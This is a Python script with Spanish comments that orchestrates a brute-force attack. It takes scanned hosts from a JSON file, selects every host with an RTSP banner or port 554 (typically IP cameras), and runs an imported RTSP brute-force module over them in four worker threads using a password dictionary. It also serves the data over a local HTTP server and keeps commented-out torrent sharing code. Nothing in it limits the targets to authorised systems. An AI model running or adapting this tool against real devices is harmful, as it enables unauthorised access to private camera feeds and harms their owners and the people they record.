import os
import json
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
from queue import Queue
#from torrentool.api import Torrent

from rtspBrute import RTSPBruteModule
from common import cargar_datos, actualizar_datos

class NoCacheHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            super().do_GET()
        except ConnectionAbortedError:
            print("Se ha producido una conexiÃ³n abortada por el cliente.")

    def end_headers(self):
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        super().end_headers()

def start_http_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, NoCacheHandler)
    print(f'Servidor iniciado en http://127.0.0.1:{port}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

#def create_torrent(file_path, output_dir):
    # Crear un nuevo torrent a partir de un archivo o directorio
#    torrent = Torrent.create_from(file_path)  
#    torrent.announce_urls = ['udp://tracker.openbittorrent.com:80']
#    torrent_path = os.path.join(output_dir, 'datos.torrent')
#    torrent.to_file(torrent_path)  # Guardar el torrent

#    print(f"Torrent creado y guardado en {torrent_path}")

#def seed_torrent(torrent_path):
#    print(f"Sembrando: {torrent_path}")

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RTSPBruteModule()
        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

if __name__ == '__main__':
    # Iniciar el hilo para actualizar datos
    threading.Thread(target=actualizar_datos, daemon=True).start()

    # Iniciar el servidor HTTP en un hilo separado
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    
    json_file = 'datos.json'
#    if not os.path.exists('datos.torrent'):
#        create_torrent(json_file, '.')

#    # Iniciar el semillero del torrent
#    seed_thread = threading.Thread(target=seed_torrent, args=('datos.torrent',), daemon=True)
#    seed_thread.start()

    # Cargar los datos
    data = cargar_datos()

    # Filtrar las entradas para obtener solo las que usan el puerto 554 o contienen 'RTSP' en el banner
    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]

    # Crear una cola para los trabajos de brute force
    q = Queue()
    
    # Enviar los targets a la cola
    for target in targets:
        q.put(target)

    # Crear e iniciar los hilos de brute force
    dictionary_file = "diccionario.txt"  # AsegÃºrate de que este archivo exista
    num_worker_threads = 4  # Ajusta el nÃºmero de hilos segÃºn sea necesario
    for _ in range(num_worker_threads):
        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()

    # Esperar a que todos los trabajos se completen
    q.join()

    # Esperar a que el hilo del servidor HTTP termine antes de cerrar el programa principal
    server_thread.join()
